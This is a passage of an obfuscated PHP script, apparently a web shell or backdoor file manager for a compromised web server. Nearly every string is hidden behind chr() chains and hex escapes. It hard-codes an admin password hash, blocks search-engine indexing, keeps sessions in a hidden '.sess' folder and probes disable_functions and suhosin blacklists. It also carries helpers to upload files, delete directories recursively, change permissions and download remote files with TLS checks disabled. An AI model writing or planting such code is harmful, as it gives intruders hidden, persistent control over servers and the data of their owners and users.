<?php

if (!function_exists(chr(105).chr(115).chr(95).chr(102).chr(110).chr(95).chr(117).chr(115).chr(97).chr(98).chr(108).chr(101))) {
    function is_fn_usable($_fe4e19)
    {
        
        if (!function_exists($_fe4e19))
            return false;

        
        $_931cba = (string)@ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73");
        $_c73117 = (string)@ini_get(chr(115).chr(117).chr(104).chr(111).chr(115).chr(105).chr(110).chr(46).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(111).chr(114).chr(46).chr(102).chr(117).chr(110).chr(99).chr(46).chr(98).chr(108).chr(97).chr(99).chr(107).chr(108).chr(105).chr(115).chr(116));

        $_f68206 = array();
        if ($_931cba !== '')
            $_f68206 = array_merge($_f68206, array_map("\x74\x72\x69\x6d", explode(chr(44), $_931cba)));
        if ($_c73117 !== "")
            $_f68206 = array_merge($_f68206, array_map(chr(116).chr(114).chr(105).chr(109), explode("\x2c", $_c73117)));

        if (!empty($_f68206)) {
            $_f68206 = array_filter(array_map("\x73\x74\x72\x74\x6f\x6c\x6f\x77\x65\x72", $_f68206));
            if (in_array(strtolower($_fe4e19), $_f68206, true))
                return false;
        }
        return true;
    }
}
if (function_exists("\x64\x61\x74\x65\x5f\x64\x65\x66\x61\x75\x6c\x74\x5f\x74\x69\x6d\x65\x7a\x6f\x6e\x65\x5f\x73\x65\x74")) {
    date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : "\x55\x54\x43");
}


$_6139be = sys_get_temp_dir();
if (!is_writable($_6139be)) {
    $_5e2589 = isset($_SERVER[chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(70).chr(73).chr(76).chr(69).chr(78).chr(65).chr(77).chr(69)]) ? @realpath($_SERVER[chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(70).chr(73).chr(76).chr(69).chr(78).chr(65).chr(77).chr(69)]) : "";
    $_6139be = ($_5e2589 ? dirname($_5e2589) : sys_get_temp_dir()) . "\x2f\x2e\x73\x65\x73\x73";
    if (!is_dir($_6139be)) @mkdir($_6139be, 0700, true);
}
@ini_set("\x73\x65\x73\x73\x69\x6f\x6e\x2e\x73\x61\x76\x65\x5f\x70\x61\x74\x68", $_6139be);
session_start();
if (empty($_SESSION["\x63\x73\x72\x66"])) {
    $_SESSION["\x63\x73\x72\x66"] = bin2hex(_f547edb8a(16));
}


header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x75\x74\x66\x2d\x38");
header("\x58\x2d\x52\x6f\x62\x6f\x74\x73\x2d\x54\x61\x67\x3a\x20\x6e\x6f\x69\x6e\x64\x65\x78\x2c\x20\x6e\x6f\x66\x6f\x6c\x6c\x6f\x77\x2c\x20\x6e\x6f\x61\x72\x63\x68\x69\x76\x65\x2c\x20\x6e\x6f\x73\x6e\x69\x70\x70\x65\x74\x2c\x20\x6e\x6f\x69\x6d\x61\x67\x65\x69\x6e\x64\x65\x78", true);
header("\x52\x65\x66\x65\x72\x72\x65\x72\x2d\x50\x6f\x6c\x69\x63\x79\x3a\x20\x6e\x6f\x2d\x72\x65\x66\x65\x72\x72\x65\x72");
header(chr(88).chr(45).chr(70).chr(114).chr(97).chr(109).chr(101).chr(45).chr(79).chr(112).chr(116).chr(105).chr(111).chr(110).chr(115).chr(58).chr(32).chr(68).chr(69).chr(78).chr(89));
header(chr(67).chr(97).chr(99).chr(104).chr(101).chr(45).chr(67).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(58).chr(32).chr(110).chr(111).chr(45).chr(115).chr(116).chr(111).chr(114).chr(101).chr(44).chr(32).chr(110).chr(111).chr(45).chr(99).chr(97).chr(99).chr(104).chr(101).chr(44).chr(32).chr(109).chr(117).chr(115).chr(116).chr(45).chr(114).chr(101).chr(118).chr(97).chr(108).chr(105).chr(100).chr(97).chr(116).chr(101).chr(44).chr(32).chr(109).chr(97).chr(120).chr(45).chr(97).chr(103).chr(101).chr(61).chr(48));
header("\x50\x72\x61\x67\x6d\x61\x3a\x20\x6e\x6f\x2d\x63\x61\x63\x68\x65");
header("\x45\x78\x70\x69\x72\x65\x73\x3a\x20\x30");


define(chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82), chr(97).chr(100).chr(109).chr(105).chr(110));
define(chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(65).chr(83).chr(83).chr(95).chr(72).chr(65).chr(83).chr(72), chr(36).chr(50).chr(97).chr(36).chr(49).chr(50).chr(36).chr(116).chr(86).chr(100).chr(105).chr(52).chr(68).chr(69).chr(86).chr(57).chr(107).chr(117).chr(109).chr(78).chr(112).chr(52).chr(88).chr(99).chr(81).chr(47).chr(69).chr(69).chr(46).chr(76).chr(89).chr(83).chr(86).chr(50).chr(118).chr(103).chr(78).chr(55).chr(84).chr(99).chr(71).chr(84).chr(88).chr(76).chr(68).chr(106).chr(119).chr(121).chr(53).chr(86).chr(86).chr(86).chr(106).chr(48).chr(85).chr(107).chr(66).chr(112).chr(108).chr(117));


if (!function_exists("\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65")) {
    function http_response_code($_c66063 = NULL)
    {
        if ($_c66063 !== NULL) {
            $_75653e = "\x55\x6e\x6b\x6e\x6f\x77\x6e\x20\x45\x72\x72\x6f\x72";
            switch ($_c66063) {
                case 100:
                    $_75653e = "\x43\x6f\x6e\x74\x69\x6e\x75\x65";
                    break;
                case 101:
                    $_75653e = chr(83).chr(119).chr(105).chr(116).chr(99).chr(104).chr(105).chr(110).chr(103).chr(32).chr(80).chr(114).chr(111).chr(116).chr(111).chr(99).chr(111).chr(108).chr(115);
                    break;
                case 200:
                    $_75653e = chr(79).chr(75);
                    break;
                case 201:
                    $_75653e = "\x43\x72\x65\x61\x74\x65\x64";
                    break;
                case 202:
                    $_75653e = "\x41\x63\x63\x65\x70\x74\x65\x64";
                    break;
                case 203:
                    $_75653e = chr(78).chr(111).chr(110).chr(45).chr(65).chr(117).chr(116).chr(104).chr(111).chr(114).chr(105).chr(116).chr(97).chr(116).chr(105).chr(118).chr(101).chr(32).chr(73).chr(110).chr(102).chr(111).chr(114).chr(109).chr(97).chr(116).chr(105).chr(111).chr(110);
                    break;
                case 204:
                    $_75653e = "\x4e\x6f\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 205:
                    $_75653e = "\x52\x65\x73\x65\x74\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 206:
                    $_75653e = "\x50\x61\x72\x74\x69\x61\x6c\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 300:
                    $_75653e = "\x4d\x75\x6c\x74\x69\x70\x6c\x65\x20\x43\x68\x6f\x69\x63\x65\x73";
                    break;
                case 301:
                    $_75653e = "\x4d\x6f\x76\x65\x64\x20\x50\x65\x72\x6d\x61\x6e\x65\x6e\x74\x6c\x79";
                    break;
                case 302:
                    $_75653e = chr(77).chr(111).chr(118).chr(101).chr(100).chr(32).chr(84).chr(101).chr(109).chr(112).chr(111).chr(114).chr(97).chr(114).chr(105).chr(108).chr(121);
                    break;
                case 303:
                    $_75653e = chr(83).chr(101).chr(101).chr(32).chr(79).chr(116).chr(104).chr(101).chr(114);
                    break;
                case 304:
                    $_75653e = chr(78).chr(111).chr(116).chr(32).chr(77).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100);
                    break;
                case 305:
                    $_75653e = "\x55\x73\x65\x20\x50\x72\x6f\x78\x79";
                    break;
                case 400:
                    $_75653e = chr(66).chr(97).chr(100).chr(32).chr(82).chr(101).chr(113).chr(117).chr(101).chr(115).chr(116);
                    break;
                case 401:
                    $_75653e = "\x55\x6e\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64";
                    break;
                case 402:
                    $_75653e = "\x50\x61\x79\x6d\x65\x6e\x74\x20\x52\x65\x71\x75\x69\x72\x65\x64";
                    break;
                case 403:
                    $_75653e = chr(70).chr(111).chr(114).chr(98).chr(105).chr(100).chr(100).chr(101).chr(110);
                    break;
                case 404:
                    $_75653e = chr(78).chr(111).chr(116).chr(32).chr(70).chr(111).chr(117).chr(110).chr(100);
                    break;
                case 405:
                    $_75653e = "\x4d\x65\x74\x68\x6f\x64\x20\x4e\x6f\x74\x20\x41\x6c\x6c\x6f\x77\x65\x64";
                    break;
                case 406:
                    $_75653e = "\x4e\x6f\x74\x20\x41\x63\x63\x65\x70\x74\x61\x62\x6c\x65";
                    break;
                case 407:
                    $_75653e = chr(80).chr(114).chr(111).chr(120).chr(121).chr(32).chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(82).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100);
                    break;
                case 408:
                    $_75653e = "\x52\x65\x71\x75\x65\x73\x74\x20\x54\x69\x6d\x65\x2d\x6f\x75\x74";
                    break;
                case 409:
                    $_75653e = "\x43\x6f\x6e\x66\x6c\x69\x63\x74";
                    break;
                case 410:
                    $_75653e = "\x47\x6f\x6e\x65";
                    break;
                case 411:
                    $_75653e = chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(32).chr(82).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100);
                    break;
                case 412:
                    $_75653e = chr(80).chr(114).chr(101).chr(99).chr(111).chr(110).chr(100).chr(105).chr(116).chr(105).chr(111).chr(110).chr(32).chr(70).chr(97).chr(105).chr(108).chr(101).chr(100);
                    break;
                case 413:
                    $_75653e = "\x52\x65\x71\x75\x65\x73\x74\x20\x45\x6e\x74\x69\x74\x79\x20\x54\x6f\x6f\x20\x4c\x61\x72\x67\x65";
                    break;
                case 414:
                    $_75653e = "\x52\x65\x71\x75\x65\x73\x74\x2d\x55\x52\x49\x20\x54\x6f\x6f\x20\x4c\x61\x72\x67\x65";
                    break;
                case 415:
                    $_75653e = chr(85).chr(110).chr(115).chr(117).chr(112).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100).chr(32).chr(77).chr(101).chr(100).chr(105).chr(97).chr(32).chr(84).chr(121).chr(112).chr(101);
                    break;
                case 500:
                    $_75653e = chr(73).chr(110).chr(116).chr(101).chr(114).chr(110).chr(97).chr(108).chr(32).chr(83).chr(101).chr(114).chr(118).chr(101).chr(114).chr(32).chr(69).chr(114).chr(114).chr(111).chr(114);
                    break;
                case 501:
                    $_75653e = chr(78).chr(111).chr(116).chr(32).chr(73).chr(109).chr(112).chr(108).chr(101).chr(109).chr(101).chr(110).chr(116).chr(101).chr(100);
                    break;
                case 502:
                    $_75653e = chr(66).chr(97).chr(100).chr(32).chr(71).chr(97).chr(116).chr(101).chr(119).chr(97).chr(121);
                    break;
                case 503:
                    $_75653e = "\x53\x65\x72\x76\x69\x63\x65\x20\x55\x6e\x61\x76\x61\x69\x6c\x61\x62\x6c\x65";
                    break;
                case 504:
                    $_75653e = chr(71).chr(97).chr(116).chr(101).chr(119).chr(97).chr(121).chr(32).chr(84).chr(105).chr(109).chr(101).chr(45).chr(111).chr(117).chr(116);
                    break;
                case 505:
                    $_75653e = "\x48\x54\x54\x50\x20\x56\x65\x72\x73\x69\x6f\x6e\x20\x6e\x6f\x74\x20\x73\x75\x70\x70\x6f\x72\x74\x65\x64";
                    break;
            }
            $_b2aaf9 = (isset($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x50\x52\x4f\x54\x4f\x43\x4f\x4c"]) ? $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x50\x52\x4f\x54\x4f\x43\x4f\x4c"] : chr(72).chr(84).chr(84).chr(80).chr(47).chr(49).chr(46).chr(48));
            header($_b2aaf9 . "\x20" . $_c66063 . chr(32) . $_75653e);
            $GLOBALS["\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65"] = $_c66063;
        }
        else {
            $_c66063 = (isset($GLOBALS[chr(104).chr(116).chr(116).chr(112).chr(95).chr(114).chr(101).chr(115).chr(112).chr(111).chr(110).chr(115).chr(101).chr(95).chr(99).chr(111).chr(100).chr(101)]) ? $GLOBALS[chr(104).chr(116).chr(116).chr(112).chr(95).chr(114).chr(101).chr(115).chr(112).chr(111).chr(110).chr(115).chr(101).chr(95).chr(99).chr(111).chr(100).chr(101)] : 200);
        }
        return $_c66063;
    }
}

if (!function_exists(chr(115).chr(121).chr(115).chr(95).chr(103).chr(101).chr(116).chr(95).chr(116).chr(101).chr(109).chr(112).chr(95).chr(100).chr(105).chr(114))) {
    function sys_get_temp_dir()
    {
        if (!empty($_ENV[chr(84).chr(77).chr(80)])) {
            return realpath($_ENV[chr(84).chr(77).chr(80)]);
        }
        if (!empty($_ENV["\x54\x4d\x50\x44\x49\x52"])) {
            return realpath($_ENV["\x54\x4d\x50\x44\x49\x52"]);
        }
        if (!empty($_ENV[chr(84).chr(69).chr(77).chr(80)])) {
            return realpath($_ENV["\x54\x45\x4d\x50"]);
        }
        $_f83594 = tempnam(dirname(__FILE__), "");
        if (file_exists($_f83594)) {
            unlink($_f83594);
            return realpath(dirname($_f83594));
        }
        return null;
    }
}

if (!function_exists("\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73")) {
    if (!defined(chr(70).chr(73).chr(76).chr(69).chr(95).chr(65).chr(80).chr(80).chr(69).chr(78).chr(68))) {
        define("\x46\x49\x4c\x45\x5f\x41\x50\x50\x45\x4e\x44", 8);
    }
    function file_put_contents($_528aa6, $_fa026a, $_f414fe = 0)
    {
        $_d92393 = ($_f414fe & FILE_APPEND) ? "\x61\x62" : "\x77\x62";
        $_bc8cc3 = @fopen($_528aa6, $_d92393);
        if ($_bc8cc3 === false) {
            return false;
        }
        $_222244 = @fwrite($_bc8cc3, $_fa026a);
        @fclose($_bc8cc3);
        return $_222244;
    }
}

if (!function_exists(chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(112).chr(121).chr(95).chr(116).chr(111).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109))) {
    function stream_copy_to_stream($_0dcaea, $_5228c6)
    {
        $_cac730 = 0;
        while (!feof($_0dcaea)) {
            $_89658e = @fread($_0dcaea, 8192);
            if ($_89658e === false || $_89658e === "") {
                break;
            }
            $_351ad1 = @fwrite($_5228c6, $_89658e);
            if ($_351ad1 === false) {
                break;
            }
            $_cac730 += $_351ad1;
        }
        return $_cac730;
    }
}

function h($_86dfb0)
{
    return htmlspecialchars($_86dfb0, ENT_QUOTES, chr(85).chr(84).chr(70).chr(45).chr(56));
}


if (!function_exists(chr(106).chr(101))) {
    function je($_52ceb2)
    {
        if (function_exists(chr(106).chr(115).chr(111).chr(110).chr(95).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101))) {
            return json_encode($_52ceb2);
        }
        
        if (is_bool($_52ceb2))
            return $_52ceb2 ? chr(116).chr(114).chr(117).chr(101) : "\x66\x61\x6c\x73\x65";
        if (is_numeric($_52ceb2))
            return (string)$_52ceb2;
        if ($_52ceb2 === null)
            return "\x6e\x75\x6c\x6c";
        $_86dfb0 = str_replace(
            array(chr(92), chr(34), chr(13), "\x0a", "\x09", "\x2f"),
            array("\x5c\x5c", chr(92).chr(34), "\x5c\x72", "\x5c\x6e", chr(92).chr(116), "\x5c\x2f"),
            (string)$_52ceb2
        );
        return "\x22" . $_86dfb0 . "\x22";
    }
}

if (!function_exists(chr(104).chr(97).chr(115).chr(104).chr(95).chr(101).chr(113).chr(117).chr(97).chr(108).chr(115))) {
    function hash_equals($_e4f5cb, $_fe6109)
    {
        if (!is_string($_e4f5cb) || !is_string($_fe6109))
            return false;
        $_351ad1 = strlen($_e4f5cb);
        if ($_351ad1 !== strlen($_fe6109))
            return false;
        $_8ed213 = 0;
        for ($_880dfd = 0; $_880dfd < $_351ad1; $_880dfd++)
            $_8ed213 |= ord($_e4f5cb[$_880dfd]) ^ ord($_fe6109[$_880dfd]);
        return $_8ed213 === 0;
    }
}


if (!function_exists("\x69\x73\x5f\x66\x6e\x5f\x75\x73\x61\x62\x6c\x65")) {
    function is_fn_usable($_fe4e19)
    {
        if (!function_exists($_fe4e19))
            return false;

        $_931cba = (string)@ini_get(chr(100).chr(105).chr(115).chr(97).chr(98).chr(108).chr(101).chr(95).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(115));
        $_c73117 = (string)@ini_get(chr(115).chr(117).chr(104).chr(111).chr(115).chr(105).chr(110).chr(46).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(111).chr(114).chr(46).chr(102).chr(117).chr(110).chr(99).chr(46).chr(98).chr(108).chr(97).chr(99).chr(107).chr(108).chr(105).chr(115).chr(116)); 

        $_f68206 = array();
        if ($_931cba !== "") {
            $_f68206 = array_merge($_f68206, array_map(chr(116).chr(114).chr(105).chr(109), explode(chr(44), $_931cba)));
        }
        if ($_c73117 !== "") {
            $_f68206 = array_merge($_f68206, array_map("\x74\x72\x69\x6d", explode(chr(44), $_c73117)));
        }
        $_f68206 = array_filter(array_map(chr(115).chr(116).chr(114).chr(116).chr(111).chr(108).chr(111).chr(119).chr(101).chr(114), $_f68206));
        return !in_array(strtolower($_fe4e19), $_f68206, true);
    }
}

function _f547edb8a($_351ad1)
{
    if (is_fn_usable("\x72\x61\x6e\x64\x6f\x6d\x5f\x62\x79\x74\x65\x73"))
        return random_bytes($_351ad1);
    if (is_fn_usable(chr(111).chr(112).chr(101).chr(110).chr(115).chr(115).chr(108).chr(95).chr(114).chr(97).chr(110).chr(100).chr(111).chr(109).chr(95).chr(112).chr(115).chr(101).chr(117).chr(100).chr(111).chr(95).chr(98).chr(121).chr(116).chr(101).chr(115))) {
        $_0c8d54 = false;
        $_fe6109 = openssl_random_pseudo_bytes($_351ad1, $_0c8d54);
        if ($_fe6109 !== false && $_0c8d54)
            return $_fe6109;
    }
    $_36db60 = '';
    for ($_880dfd = 0; $_880dfd < $_351ad1; $_880dfd++)
        $_36db60 .= chr(mt_rand(0, 255));
    return $_36db60;
}
function _f172932e7($_fe6109)
{
    $_8f784a = array("\x42", chr(75).chr(66), chr(77).chr(66), chr(71).chr(66), chr(84).chr(66));
    $_880dfd = 0;
    while ($_fe6109 >= 1024 && $_880dfd < count($_8f784a) - 1) {
        $_fe6109 /= 1024;
        $_880dfd++;
    }
    return ($_880dfd ? number_format($_fe6109, 2) : (string)$_fe6109) . chr(32) . $_8f784a[$_880dfd];
}
function _fcc5d0122($_bc8cc3)
{
    $_71ae88 = @fileperms($_bc8cc3);
    if ($_71ae88 === false)
        return "\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f";
    $_d172fd = ($_71ae88 & 0x4000) ? chr(100) : (($_71ae88 & 0xA000) ? "\x6c" : chr(45));
    $_86dfb0 = (($_71ae88 & 0x0100) ? chr(114) : chr(45)) . (($_71ae88 & 0x0080) ? chr(119) : "\x2d") . (($_71ae88 & 0x0040) ? chr(120) : chr(45)); 
    $_86dfb0 .= (($_71ae88 & 0x0020) ? chr(114) : chr(45)) . (($_71ae88 & 0x0010) ? "\x77" : chr(45)) . (($_71ae88 & 0x0008) ? chr(120) : chr(45)); 
    $_86dfb0 .= (($_71ae88 & 0x0004) ? chr(114) : chr(45)) . (($_71ae88 & 0x0002) ? chr(119) : chr(45)) . (($_71ae88 & 0x0001) ? chr(120) : chr(45)); 
    return $_d172fd . $_86dfb0;
}
function _fa695a864($_bc8cc3)
{
    $_520e7e = @fileowner($_bc8cc3);
    if ($_520e7e === false)
        return "\x3f";
    if (function_exists(chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100))) {
        $_836f8d = @posix_getpwuid($_520e7e);
        if ($_836f8d && isset($_836f8d["\x6e\x61\x6d\x65"]))
            return $_836f8d["\x6e\x61\x6d\x65"];
    }
    return (string)$_520e7e;
}
function _f0d5cf37f($_86dfb0)
{
    $_86dfb0 = trim($_86dfb0);
    if ($_86dfb0 === '')
        return 0644;
    if (ctype_digit($_86dfb0)) {
        if ($_86dfb0[0] !== chr(48))
            $_86dfb0 = chr(48) . $_86dfb0;
        return intval($_86dfb0, 8);
    }
    return 0644;
}
function _fce7b8327($_71ae88)
{
    if (is_dir($_71ae88) || !is_file($_71ae88))
        return false;
    $_d627b9 = strtolower(pathinfo($_71ae88, PATHINFO_EXTENSION));
    $_75653e = array("\x74\x78\x74", chr(109).chr(100), "\x6a\x73\x6f\x6e", "\x6a\x73", chr(116).chr(115), chr(99).chr(115).chr(115), chr(115).chr(99).chr(115).chr(115), "\x6c\x65\x73\x73", "\x68\x74\x6d\x6c", chr(104).chr(116).chr(109), "\x78\x6d\x6c", chr(115).chr(118).chr(103), chr(112).chr(104).chr(112), "\x70\x68\x74\x6d\x6c", chr(105).chr(110).chr(99), chr(105).chr(110).chr(105), "\x63\x66\x67", chr(101).chr(110).chr(118), "\x79\x6d\x6c", chr(121).chr(97).chr(109).chr(108), chr(112).chr(121), chr(114).chr(98), chr(103).chr(111), "\x72\x73", chr(99), chr(104), "\x63\x70\x70", "\x68\x70\x70", chr(106).chr(97).chr(118).chr(97), "\x6b\x74", chr(115).chr(113).chr(108), chr(99).chr(115).chr(118), chr(108).chr(111).chr(103));
    if (in_array($_d627b9, $_75653e, true))
        return true;
    $_86dfb0 = @file_get_contents($_71ae88, false, null, 0, 2048);
    if ($_86dfb0 === false)
        return false;
    return (bool)preg_match("\x2f\x2f\x75", $_86dfb0);
}
function _f46d3561b($_a80a4a, $_90ad18)
{
    $_90ad18 = str_replace("\x00", '', $_90ad18);
    if ($_90ad18 === '')
        return $_a80a4a;
    if ($_90ad18[0] === DIRECTORY_SEPARATOR || preg_match("\x7e\x5e\x5b\x41\x2d\x5a\x61\x2d\x7a\x5d\x3a\x5c\x5c\x7e", $_90ad18))
        return $_90ad18;
    return rtrim($_a80a4a, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $_90ad18;
}
function _f0e7df4b1($_e6f0b6)
{
    $_66f6b0 = @opendir($_e6f0b6);
    if ($_66f6b0 === false)
        return array();
    $_baeb7e = array();
    while (false !== ($_5be2f1 = readdir($_66f6b0))) {
        if ($_5be2f1 === chr(46) || $_5be2f1 === "\x2e\x2e")
            continue;
        $_baeb7e[] = $_5be2f1;
    }
    closedir($_66f6b0);
    return $_baeb7e;
}
function _fbb0fa868($_71ae88)
{
    if (!file_exists($_71ae88))
        return true;
    if (is_file($_71ae88) || is_link($_71ae88))
        return @unlink($_71ae88);
    $_9ece03 = true;
    $_66f6b0 = @opendir($_71ae88);
    if ($_66f6b0 === false)
        return false;
    while (false !== ($_52ceb2 = readdir($_66f6b0))) {
        if ($_52ceb2 === chr(46) || $_52ceb2 === "\x2e\x2e")
            continue;
        $_9ece03 = _fbb0fa868($_71ae88 . DIRECTORY_SEPARATOR . $_52ceb2) && $_9ece03;
    }
    closedir($_66f6b0);
    return @rmdir($_71ae88) && $_9ece03;
}
function _ffa8e98f4($_164ce0, $_5228c6)
{
    $_3ebd7d = array();
    if (@move_uploaded_file($_164ce0, $_5228c6))
        return array(true, null);
    $_3ebd7d[] = chr(109).chr(111).chr(118).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101);
    if (@rename($_164ce0, $_5228c6))
        return array(true, null);
    $_3ebd7d[] = "\x72\x65\x6e\x61\x6d\x65";
    if (@copy($_164ce0, $_5228c6))
        return array(true, null);
    $_3ebd7d[] = chr(99).chr(111).chr(112).chr(121);
    $_ed700f = @file_get_contents($_164ce0);
    if ($_ed700f !== false && @file_put_contents($_5228c6, $_ed700f) !== false)
        return array(true, null);
    $_3ebd7d[] = "\x67\x65\x74\x2b\x70\x75\x74";
    $_cb3c70 = @fopen($_164ce0, "\x72\x62");
    $_36db60 = @fopen($_5228c6, "\x77\x62");
    if ($_cb3c70 && $_36db60) {
        $_7c37a1 = stream_copy_to_stream($_cb3c70, $_36db60);
        @fclose($_cb3c70);
        @fclose($_36db60);
        if ($_7c37a1 !== false)
            return array(true, null);
        $_3ebd7d[] = chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(112).chr(121);
    }
    else {
        $_3ebd7d[] = "\x66\x6f\x70\x65\x6e";
    }
    return array(false, implode(chr(59).chr(32), $_3ebd7d) . chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100));
}
if (!function_exists("\x66\x65\x74\x63\x68\x55\x72\x6c\x54\x6f\x46\x69\x6c\x65")) {
    function fetchUrlToFile($_4e1d7e, $_5228c6)
    {
        $_fc344b = array();

        
        if (is_fn_usable("\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74")) {
            $_24e34e = @curl_init($_4e1d7e);
            $_e3c464 = @fopen($_5228c6, chr(119).chr(98));
            if ($_24e34e && $_e3c464) {
                @curl_setopt($_24e34e, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($_24e34e, CURLOPT_FILE, $_e3c464);
                @curl_setopt($_24e34e, CURLOPT_FAILONERROR, true);
                @curl_setopt($_24e34e, CURLOPT_USERAGENT, chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97).chr(47).chr(53).chr(46).chr(48));
                @curl_setopt($_24e34e, CURLOPT_SSL_VERIFYPEER, false);
                @curl_setopt($_24e34e, CURLOPT_SSL_VERIFYHOST, 0);
                @curl_setopt($_24e34e, CURLOPT_TIMEOUT, 60);
                $_9ece03 = @curl_exec($_24e34e);
                $_5be2f1 = @curl_error($_24e34e);
                @curl_close($_24e34e);
                @fclose($_e3c464);

                if ($_9ece03)
                    return array(true, null);
                $_fc344b[] = "\x63\x55\x52\x4c\x3a\x20" . $_5be2f1;
                @unlink($_5228c6);
            }
            else {
                if ($_24e34e)
                    @curl_close($_24e34e);
                if ($_e3c464)
                    @fclose($_e3c464);
                $_fc344b[] = chr(105).chr(110).chr(105).chr(116).chr(32).chr(99).chr(85).chr(82).chr(76).chr(47).chr(102).chr(111).chr(112).chr(101).chr(110);
            }
        }

        
        $_2bafa7 = @stream_context_create(array(
            chr(104).chr(116).chr(116).chr(112) => array(
                chr(102).chr(111).chr(108).chr(108).chr(111).chr(119).chr(95).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110) => 1,
                "\x74\x69\x6d\x65\x6f\x75\x74" => 60,
                "\x68\x65\x61\x64\x65\x72" => chr(85).chr(115).chr(101).chr(114).chr(45).chr(65).chr(103).chr(101).chr(110).chr(116).chr(58).chr(32).chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97).chr(47).chr(53).chr(46).chr(48).chr(13).chr(10),
            ),
            chr(115).chr(115).chr(108) => array(
                chr(118).chr(101).chr(114).chr(105).chr(102).chr(121).chr(95).chr(112).chr(101).chr(101).chr(114) => false,
                chr(118).chr(101).chr(114).chr(105).chr(102).chr(121).chr(95).chr(112).chr(101).chr(101).chr(114).chr(95).chr(110).chr(97).chr(109).chr(101) => false,
            ),
        ));

        
        if (@copy($_4e1d7e, $_5228c6, $_2bafa7))
            return array(true, null);
        $_fc344b[] = "\x63\x6f\x70\x79\x28\x75\x72\x6c\x29";

        
        $_ed700f = @file_get_contents($_4e1d7e, false, $_2bafa7);
        if ($_ed700f !== false && @file_put_contents($_5228c6, $_ed700f) !== false)
            return array(true, null);
        $_fc344b[] = "\x67\x65\x74\x2b\x70\x75\x74";

        
        $_cb3c70 = @fopen($_4e1d7e, "\x72\x62", false, $_2bafa7);
        $_36db60 = @fopen($_5228c6, "\x77\x62");
        if ($_cb3c70 && $_36db60) {
            $_7c37a1 = @stream_copy_to_stream($_cb3c70, $_36db60);
            @fclose($_cb3c70);
            @fclose($_36db60);
            if ($_7c37a1 !== false)
                return array(true, null);
            $_fc344b[] = chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(112).chr(121);
            @unlink($_5228c6);
        }
        else {
            $_fc344b[] = "\x66\x6f\x70\x65\x6e\x28\x75\x72\x6c\x2f\x64\x65\x73\x74\x29";
        }

        return array(false, implode(chr(59).chr(32), $_fc344b) . chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100));
    }
}
function _faa002151($_1db743)
{
    $_36db60 = array();
    if (preg_match(chr(126).chr(94).chr(91).chr(65).chr(45).chr(90).chr(97).chr(45).chr(122).chr(93).chr(58).chr(92).chr(92).chr(126), $_1db743)) {
        $_6c8336 = substr($_1db743, 0, 2);
        $_9ee12f = substr($_1db743, 2);
        $_aa335d = array_values(array_filter(explode("\x5c\x5c", $_9ee12f), "\x73\x74\x72\x6c\x65\x6e"));
        $_3c866e = $_6c8336 . chr(92);
        $_36db60[] = array($_6c8336 . "\x5c", $_3c866e);
        foreach ($_aa335d as $_86dfb0) {
            $_3c866e .= $_86dfb0 . chr(92);
            $_36db60[] = array($_86dfb0, rtrim($_3c866e, "\x5c"));
        }
    }
    else {
        $_aa335d = array_values(array_filter(explode("\x2f", $_1db743), "\x73\x74\x72\x6c\x65\x6e"));
        $_3c866e = chr(47);
        $_36db60[] = array(chr(47), "\x2f");
        foreach ($_aa335d as $_86dfb0) {
            $_3c866e .= $_86dfb0 . "\x2f";
            $_36db60[] = array($_86dfb0, rtrim($_3c866e, "\x2f"));
        }
    }
